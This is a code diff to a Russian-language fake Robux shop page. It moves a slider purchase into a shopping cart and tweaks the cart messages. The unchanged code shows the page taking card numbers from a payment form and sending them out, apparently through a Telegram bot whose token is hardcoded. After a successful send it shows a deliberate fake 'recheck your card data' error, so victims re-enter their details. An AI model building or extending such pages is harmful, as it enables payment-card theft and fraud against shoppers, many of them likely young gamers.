@@ -165,7 +165,7 @@
             <div class="selected-amount">
                 вы хотите купить: <span id="selectedAmount">100</span> робуксов
             </div>
-            <button class="buy-btn" id="buyWithSliderBtn">💎 купить выбранное количество</button>
+            <button class="buy-btn" id="buyWithSliderBtn">💎 добавить в корзину выбранное количество</button>
         </div>
 
         <div class="products-grid">
@@ -253,7 +253,14 @@
         selectedSpan.innerText = val.toLocaleString('ru-RU');
     });
     
-    // кнопка покупки выбранного количества
+    // глобальная функция добавления в корзину и показа сообщения
+    let cart = [];
+    function showMessage(msg) {
+        let d=document.createElement('div'); d.innerText=msg; d.style.cssText='position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999;';
+        document.body.appendChild(d); setTimeout(()=>d.remove(),2500);
+    }
+    
+    // кнопка покупки выбранного количества (добавление в корзину)
     document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
         let amount = parseInt(slider.value);
         if (amount <= 0) return;
@@ -261,17 +268,14 @@
             showErrorToast("недостаточно робуксов в наличии");
             return;
         }
-        // списываем
+        // списываем из остатка
         currentStock -= amount;
         updateStockUI();
-        // формальное уведомление (красная метка не нужна, но сделаем приятное сообщение)
-        let msgDiv = document.createElement('div');
-        msgDiv.innerText = `✅ вы купили ${amount.toLocaleString('ru-RU')} робуксов! спасибо ❤️`;
-        msgDiv.style.cssText = 'position:fixed; bottom:20px; left:20px; background:#c38eff; color:white; padding:10px 20px; border-radius:40px; z-index:9999;';
-        document.body.appendChild(msgDiv);
-        setTimeout(() => msgDiv.remove(), 3000);
-        // обновляем корзину? нет, это отдельная покупка, не связанная с телеграм
-        // но по желанию можно добавить в корзину, но не требуется
+        // рассчитываем цену (примерно как в карточках: 100 Robux = 49 руб, т.е. 0.49 за 1)
+        let price = Math.round(amount * 0.49);
+        let itemName = `${amount.toLocaleString('ru-RU')} Robux (ползунок)`;
+        // добавляем в корзину
+        addItemToCart({ name: itemName, price: price });
     });
     
     // функция красной метки для ошибок
@@ -288,7 +292,7 @@
     // инициализация UI остатка
     updateStockUI();
     
-    // авторизация (копия из предыдущего кода)
+    // авторизация
     let currentUser = null;
     function loadUsers() {
         let users = localStorage.getItem('excellent_users');
@@ -321,8 +325,7 @@
     document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
     document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
 
-    // корзина (стандартная для товаров)
-    let cart = [];
+    // корзина и телеграм
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
 
@@ -339,20 +342,19 @@
         } catch(e) { alert('ошибка'); }
         return false;
     }
-    function showMessage(msg) {
-        let d=document.createElement('div'); d.innerText=msg; d.style.cssText='position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999;';
-        document.body.appendChild(d); setTimeout(()=>d.remove(),2500);
-    }
+    
     function addItemToCart(item) {
         cart.push(item);
         updateCartUI();
-        showMessage(`✨ ${item.name} добавлен`);
+        showMessage(`✨ ${item.name} добавлен в корзину за ${item.price} ₽`);
     }
+    
     function updateCartUI() {
         let countSpan = document.getElementById('cartCount');
         if(countSpan) countSpan.innerText = cart.length;
         renderCartModal();
     }
+    
     function renderCartModal() {
         let container = document.getElementById('cartItemsList');
         let totalSpan = document.getElementById('modalCartTotal');
@@ -376,6 +378,7 @@
             });
         });
     }
+    
     const cartModal = document.getElementById('cartModal');
     const openCartBtn = document.getElementById('openCartBtn');
     const closeCartBtn = document.getElementById('closeCartBtn');
@@ -383,7 +386,7 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // оплата из корзины
+    // оплата из корзины с выводом красной метки
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
         let cardNum = document.getElementById('cardNumber').value.trim();
@@ -402,6 +405,7 @@
             });
             let json = await resp.json();
             if(json.ok) {
+                // красная метка по требованию
                 let errToast = document.createElement('div');
                 errToast.className = 'error-toast';
                 errToast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
@@ -418,6 +422,7 @@
         } catch(e){ alert('ошибка'); }
     });
 
+    // кнопки обычных товаров
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
